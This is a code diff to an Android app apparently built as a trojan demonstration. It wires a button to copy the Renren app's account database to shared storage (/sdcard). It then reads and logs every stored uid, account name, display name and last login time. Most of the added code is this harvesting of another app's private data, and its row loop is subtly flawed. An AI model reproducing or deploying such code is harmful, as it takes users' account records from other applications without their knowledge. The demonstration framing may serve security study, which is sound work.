@@ -4,11 +4,18 @@ import android.app.Activity;
 import android.app.AlertDialog;
 import android.content.DialogInterface;
 import android.content.Intent;
+import android.database.Cursor;
+import android.database.sqlite.SQLiteDatabase;
 import android.os.Bundle;
+import android.util.Log;
 import android.view.View;
 import android.widget.Button;
 
 import com.singuloid.trojandemo.utils.DBHelper;
+import com.singuloid.trojandemo.utils.Utils;
+
+import java.io.File;
+import java.io.IOException;
 
 
 public class MainActivity extends Activity implements View.OnClickListener {
@@ -19,7 +26,7 @@ public class MainActivity extends Activity implements View.OnClickListener {
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
-        setContentView(R.layout.activity_main);
+        setContentView(R.layout.main);
         initView();
     }
 
@@ -44,8 +51,8 @@ public class MainActivity extends Activity implements View.OnClickListener {
         mTxt.setOnClickListener(this);
         mTxt2 = (Button) findViewById(R.id.txt2);
         mTxt2.setOnClickListener(this);
-//        mRenRen = (Button) findViewById(R.id.renren);
-//        mRenRen.setOnClickListener(this);
+        mRenRen = (Button) findViewById(R.id.renren);
+        mRenRen.setOnClickListener(this);
     }
 
     @Override
@@ -95,10 +102,34 @@ public class MainActivity extends Activity implements View.OnClickListener {
             case R.id.txt2:
                 startActivity(new Intent(this, OpenNotepadOnWosFile.class));
                 break;
-//            case R.id.renren:
-//                DBHelper helper = new DBHelper(this);
-//                helper.queryAccount();
-//                break;
+            case R.id.renren:
+                try {
+                    Utils.copyRenrenDbToMe();
+                    SQLiteDatabase db = SQLiteDatabase.openDatabase("/sdcard/account.db", null, SQLiteDatabase.OPEN_READONLY);
+//                SQLiteDatabase db = openOrCreateDatabase("/sdcard/account.db", this.MODE_PRIVATE ,null);
+                    getMessage(db);
+                } catch (Exception e){
+                    dialog("数据库");
+                }
+
+                break;
+        }
+    }
+
+    private void getMessage(SQLiteDatabase db){
+        String sql = "select * from account";
+        Cursor cursor = db.rawQuery(sql, null);
+//        Cursor cursor = db.query("account", new String[]{"uid", "account", "name", "last_login_time"}, null, null, null, null, null);
+
+        if (cursor.moveToFirst()) {
+            for (int i = 0; i < cursor.getCount(); i++) {
+                cursor.move(i);
+                String uid = cursor.getString(cursor.getColumnIndex("uid"));
+                String account = cursor.getString(cursor.getColumnIndex("account"));
+                String name = cursor.getString(cursor.getColumnIndex("name"));
+                String last_login_time = cursor.getString(cursor.getColumnIndex("last_login_time"));
+                Log.e(TAG, uid + account + name + last_login_time);
+            }
         }
     }
 
@@ -113,5 +144,10 @@ public class MainActivity extends Activity implements View.OnClickListener {
             }
         });
         builder.create().show();
+    }
+
+    @Override
+    protected void onDestroy() {
+        super.onDestroy();
     }
 }
